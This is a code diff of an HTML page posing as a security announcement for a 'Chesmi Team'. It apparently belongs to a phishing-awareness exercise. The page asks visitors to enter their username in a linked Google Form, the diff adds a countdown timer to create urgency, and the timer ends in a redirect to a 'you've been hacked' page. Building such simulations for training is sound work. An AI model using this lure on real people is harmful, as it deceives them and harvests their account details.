@@ -6,17 +6,32 @@
 <body>
   <h1>Important Security Announcement for Chesmi Team</h1>
   <p>Please verify your username to view this critical security update regarding your account.</p>
-  <p>This announcement will only be available for a short time. Please enter your username immediately.</p>
+
+  <div id="timer"></div>
 
   <a href="https://docs.google.com/forms/d/e/1FAIpQLSefGtcLuAZIhVcZ4Kr6EaVoooA-jFbeDqvlecpB8capioBTFw/viewform?embedded=true" target="_blank">
     Click here to view the announcement
   </a>
 
   <script>
-    // Redirect to the "You've been hacked" page after a delay (e.g., 30 seconds)
-    setTimeout(function() {
-      window.location.href = 'youve-been-hacked.html';
-    }, 30000); // 30000 milliseconds = 30 seconds
+    // Set the time (in seconds)
+    var timeLeft = 30;
+
+    // Get the timer element
+    var timerElement = document.getElementById('timer');
+
+    // Update the timer every second
+    var timerInterval = setInterval(function() {
+      timeLeft--;
+
+      // Display the time left
+      timerElement.innerHTML = 'This announcement will expire in ' + timeLeft + ' seconds';
+
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        window.location.href = 'youve-been-hacked.html';
+      }
+    }, 1000); // 1000 milliseconds = 1 second
   </script>
 </body>
 </html>
